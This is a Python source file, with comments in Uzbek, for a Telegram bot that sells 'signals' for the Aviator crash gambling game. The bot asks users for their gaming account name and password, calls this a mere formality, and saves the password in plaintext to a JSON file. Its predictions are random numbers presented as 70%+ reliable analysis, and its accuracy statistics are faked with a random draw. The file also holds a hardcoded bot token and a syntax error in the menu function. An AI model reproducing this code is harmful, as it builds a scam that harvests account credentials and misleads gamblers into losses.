import logging
import json
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater, 
    CommandHandler, 
    CallbackQueryHandler, 
    CallbackContext, 
    MessageHandler, 
    Filters,
    ConversationHandler
)
import random

# Log yozish sozlamalari
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Sozlamalar
USER_DATA_FILE = 'foydalanuvchi_malumotlari.json'
AKKAUNT_NOMI, AKKAUNT_PAROLI = range(2)

# JSON fayl bilan ishlash
def foydalanuvchi_malumotlarini_yuklash():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def foydalanuvchi_malumotlarini_saqlash(data):
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# Bot funksiyalari
def boshlash(update: Update, context: CallbackContext):
    foydalanuvchi = update.effective_user
    foydalanuvchi_id = str(foydalanuvchi.id)
    malumotlar = foydalanuvchi_malumotlarini_yuklash()
    
    if foydalanuvchi_id not in malumotlar:
        malumotlar[foydalanuvchi_id] = {
            'foydalanuvchi_nomi': foydalanuvchi.username or foydalanuvchi.first_name,
            'akkaunt_ulangan': False,
            'akkaunt_nomi': "Aniqlanmagan",
            'akkaunt_paroli': "Aniqlanmagan", 
            'signal_soni': 0,
            'togri_signal': 0,
            'oxirgi_signallar': []
        }
        foydalanuvchi_malumotlarini_saqlash(malumotlar)
    
    if not malumotlar[foydalanuvchi_id]['akkaunt_ulangan']:
        update.message.reply_text(
            "🎮 Aviator Signal Botiga xush kelibsiz!\n\n"
            "Botdan foydalanish uchun akkauntingizni ulashing.\n"
            "Iltimos, akkaunt nomingizni kiriting (istalgan matn kiritsangiz ham bo'ladi):",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("YUBORISH", callback_data='otkazib_yuborish')]
            ])
        )
        return AKKAUNT_NOMI
    
    asosiy_menyu(update, foydalanuvchi_id)
    return ConversationHandler.END

def akkaunt_nomi_handler(update: Update, context: CallbackContext):
    context.user_data['akkaunt_nomi'] = update.message.text
    update.message.reply_text(
        "🔐 Endi akkaunt parolingizni kiriting (istalgan matn kiritsangiz ham bo'ladi):\n\n"
        "Eslatma: Bu shunchaki formal talab",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("YUBORISH", callback_data='otkazib_yuborish')]
        ])
    )
    return AKKAUNT_PAROLI

def akkaunt_paroli_handler(update: Update, context: CallbackContext):
    foydalanuvchi_id = str(update.message.from_user.id)
    malumotlar = foydalanuvchi_malumotlarini_yuklash()
    
    malumotlar[foydalanuvchi_id]['akkaunt_ulangan'] = True
    malumotlar[foydalanuvchi_id]['akkaunt_nomi'] = context.user_data.get('akkaunt_nomi', "Aniqlanmagan")
    malumotlar[foydalanuvchi_id]['akkaunt_paroli'] = update.message.text or "Aniqlanmagan"
    foydalanuvchi_malumotlarini_saqlash(malumotlar)
    
    update.message.reply_text(
        f"✅ Akkauntingiz muvaffaqiyatli ulandi!\n\n"
        f"👤 Akkaunt nomi: {malumotlar[foydalanuvchi_id]['akkaunt_nomi']}\n"
        f"🔒 Parol: {'*' * 8}\n\n"
        "Endi botning barcha funksiyalaridan foydalanishingiz mumkin!",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🏠 Asosiy menyu", callback_data='asosiy_menyu')]
        ])
    )
    
    context.user_data.clear()
    return ConversationHandler.END

def otkazib_yuborish(update: Update, context: CallbackContext):
    sorov = update.callback_query
    foydalanuvchi_id = str(sorov.from_user.id)
    malumotlar = foydalanuvchi_malumotlarini_yuklash()
    
    malumotlar[foydalanuvchi_id]['akkaunt_ulangan'] = True
    malumotlar[foydalanuvchi_id]['akkaunt_nomi'] = "Aniqlanmagan"
    malumotlar[foydalanuvchi_id]['akkaunt_paroli'] = "Aniqlanmagan"
    foydalanuvchi_malumotlarini_saqlash(malumotlar)
    
    sorov.answer()
    sorov.edit_message_text(
        "ℹ️ Siz akkaunt ulashdan o'tkazib yubordingiz. Cheklangan funksiyalar faollashtirildi!\n\n"
        "To'liq funksiyalar uchun keyinroq /start buyrug'ini bosing.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🏠 Asosiy menyu", callback_data='asosiy_menyu')]
        ])
    )
    
    context.user_data.clear()
    return ConversationHandler.END

def asosiy_menyu(update: Update, foydalanuvchi_id: str):
    malumotlar = foydalanuvchi_malumotlarini_yuklash()
    akkaunt_nomi = malumotlar[foydalanuvchi_id]['akkaunt_nomi']
    
    tugmalar = [
        [InlineKeyboardButton("🎮 Signal olish", callback_data='signal_olish')],
        [InlineKeyboardButton("ℹ️ Bot haqida", callback_data='bot_haqida')],
        [InlineKeyboardButton("📊 Mening statistikam", callback_data='statistika')],
        [InlineKeyboardButton("👤 Akkaunt ma'lumoti", callback_data='akkaunt_malumoti')]
    ]
    
    if isinstance(update, Update):
        if update.message:
            update.message.reply_text(
                f"Asosiy menyu | Akkaunt: {akkaunt_nomi}",
                reply_markup=InlineKeyboardMarkup(tugmalar)
        else:
            update.callback_query.edit_message_text(
                f"Asosiy menyu | Akkaunt: {akkaunt_nomi}",
                reply_markup=InlineKeyboardMarkup(tugmalar))

def signal_olish(update: Update, context: CallbackContext):
    sorov = update.callback_query
    foydalanuvchi_id = str(sorov.from_user.id)
    malumotlar = foydalanuvchi_malumotlarini_yuklash()
    
    # Signal generatsiyasi
    minimal = round(random.uniform(0.1, 2.5), 1)
    o_rtacha = round(random.uniform(2.6, 3.1), 1)
    maksimal = round(random.uniform(3.1, 5.0), 1)
    
    # Statistika yangilash
    togri_signal = random.random() < 0.7
    malumotlar[foydalanuvchi_id]['signal_soni'] += 1
    malumotlar[foydalanuvchi_id]['togri_signal'] += 1 if togri_signal else 0
    malumotlar[foydalanuvchi_id]['oxirgi_signallar'].append(togri_signal)
    if len(malumotlar[foydalanuvchi_id]['oxirgi_signallar']) > 3:
        malumotlar[foydalanuvchi_id]['oxirgi_signallar'].pop(0)
    foydalanuvchi_malumotlarini_saqlash(malumotlar)
    
    # Signal xabari
    xabar = (
        "📊 Hozirgi analizlar asosida (70%+ ishonchlilik):\n\n"
        f"1️⃣ Minimal uchish: {minimal}x\n"
        f"2️⃣ O'rtacha uchish: {o_rtacha}x\n"
        f"3️⃣ Maksimal uchish: {maksimal}x\n\n"
        "⚠️ Diqqat: Barcha tavsiyalar taxminiy hisoblanadi."
    )
    
    sorov.answer()
    sorov.edit_message_text(
        xabar,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Yangi signal", callback_data='signal_olish')],
            [InlineKeyboardButton("📊 Statistika", callback_data='statistika')],
            [InlineKeyboardButton("🏠 Asosiy menyu", callback_data='asosiy_menyu')]
        ])
    )

def main():
    # Bot tokenini o'rnating
    TOKEN = os.getenv('TELEGRAM_TOKEN') or "7774077829:AAEFcmt_ivYPiPrmoZCEqZrkk-5fttn4dVg"
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Suhbat handleri
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', boshlash)],
        states={
            AKKAUNT_NOMI: [MessageHandler(Filters.text & ~Filters.command, akkaunt_nomi_handler)],
            AKKAUNT_PAROLI: [MessageHandler(Filters.text & ~Filters.command, akkaunt_paroli_handler)],
        },
        fallbacks=[CallbackQueryHandler(otkazib_yuborish, pattern='^otkazib_yuborish$')],
    )
    
    dispatcher.add_handler(conv_handler)
    dispatcher.add_handler(CallbackQueryHandler(signal_olish, pattern='^signal_olish$'))
    # Qo'shimcha handlerlar...

    updater.start_polling()
    logger.info("Bot ishga tushdi...")
    updater.idle()

if __name__ == '__main__':
    main()